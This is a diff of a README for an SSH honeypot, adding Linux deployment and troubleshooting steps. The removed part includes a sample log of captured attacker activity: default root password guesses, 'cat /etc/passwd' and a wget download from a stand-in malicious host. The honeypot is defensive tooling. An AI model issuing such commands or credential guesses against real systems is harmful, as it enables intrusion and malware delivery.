@@ -223,68 +223,56 @@ alerts:
 
 ---
 
-## Production Deployment
+## 🚀 Production Deployment (Linux)
 
+To deploy your honeypot on a real production server (like Ubuntu), follow these steps to ensure port 22 is handled safely:
+
+1. **Move your real SSH port**:
+   Attackers look for port 22. Move your real SSH to something else (e.g., 2222) first.
+   ```bash
+   sudo sed -i 's/#Port 22/Port 2222/' /etc/ssh/sshd_config
+   sudo systemctl restart ssh
+   ```
+
+2. **Allow ports in Firewall (UFW)**:
+   ```bash
+   sudo ufw allow 2222/tcp  # Your new real SSH port
+   sudo ufw allow 22/tcp    # The honeypot port
+   sudo ufw enable
+   ```
+
+3. **Bind to Port 22 safely**:
+   Linux prevents non-root users from binding to ports below 1024. Use `setcap` to allow the honeypot binary to use port 22 without needing `sudo` for every run:
+   ```bash
+   sudo setcap 'cap_net_bind_service=+ep' ./honeypot
+   ```
+
+4. **Run in Background**:
+   To keep the honeypot active after closing your session:
+   ```bash
+   nohup ./honeypot --no-dashboard &
+   ```
+
+### 🛠️ Troubleshooting
+
+#### "Server error: bind: address already in use"
+Another process is using your port (usually your real SSH or a previous honeypot run).
+Check what's on the port:
 ```bash
-# Run on port 22 (requires root or capability)
-sudo setcap 'cap_net_bind_service=+ep' ./honeypot
-./honeypot --config config.yaml
-
-# Or use systemd
-sudo cp honeypot /usr/local/bin/
-sudo cp config.yaml /etc/honeypot/config.yaml
+sudo lsof -i :22
+sudo lsof -i :2222
 ```
 
-Example systemd service:
-```ini
-[Unit]
-Description=SSH Honeypot
-After=network.target
+#### Dashboard not appearing
+- Ensure `enabled: true` is set in `config.yaml` under `dashboard`.
+- Try running with `sudo -E ./honeypot` to preserve terminal environment variables (like `$TERM`).
 
-[Service]
-ExecStart=/usr/local/bin/honeypot --config /etc/honeypot/config.yaml --no-dashboard
-Restart=always
-User=root
-WorkingDirectory=/etc/honeypot
-
-[Install]
-WantedBy=multi-user.target
-```
+#### GeoIP not showing countries
+- Ensure `data/GeoLite2-City.mmdb` is present in the project folder.
+- If missing, the tool will automatically try to use `ip-api.com` (requires internet access).
 
 ---
 
-## Tech Stack
+## 🛡️ License
 
-| Component | Technology |
-|-----------|-----------|
-| Language | Go 1.22 |
-| SSH protocol | `golang.org/x/crypto/ssh` |
-| Database | SQLite via `github.com/mattn/go-sqlite3` |
-| TUI Dashboard | `github.com/rivo/tview` + `tcell` |
-| GeoIP | MaxMind GeoLite2 / ip-api.com |
-| Config | YAML via `gopkg.in/yaml.v3` |
-
----
-
-## What You'll See
-
-Within minutes of deploying on a public server:
-
-```
-2026-03-13 12:00:01 [INFO] NEW CONNECTION  ip=218.92.0.x       session=1
-2026-03-13 12:00:01 [INFO] AUTH ATTEMPT    ip=218.92.0.x       user=root               pass=root       ver=SSH-2.0-libssh-0.9.5
-2026-03-13 12:00:02 [INFO] AUTH ATTEMPT    ip=218.92.0.x       user=root               pass=123456     ver=SSH-2.0-libssh-0.9.5
-2026-03-13 12:00:02 [INFO] AUTH ATTEMPT    ip=218.92.0.x       user=root               pass=password   ver=SSH-2.0-libssh-0.9.5
-2026-03-13 12:00:03 [INFO] GEOIP           ip=218.92.0.x       🇨🇳 China  Shanghai  China Telecom
-2026-03-13 12:00:04 [INFO] AUTH ACCEPTED   ip=218.92.0.x       user=root  (honeypot shell)
-2026-03-13 12:00:05 [INFO] COMMAND         ip=218.92.0.x       cmd=whoami
-2026-03-13 12:00:06 [INFO] COMMAND         ip=218.92.0.x       cmd=cat /etc/passwd
-2026-03-13 12:00:08 [INFO] COMMAND         ip=218.92.0.x       cmd=wget http://malware.example/payload.sh
-2026-03-13 12:00:11 [INFO] DISCONNECT      ip=218.92.0.x       duration=10s  creds=3  cmds=4
-```
-
----
-
-## License
-
-MIT
+This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
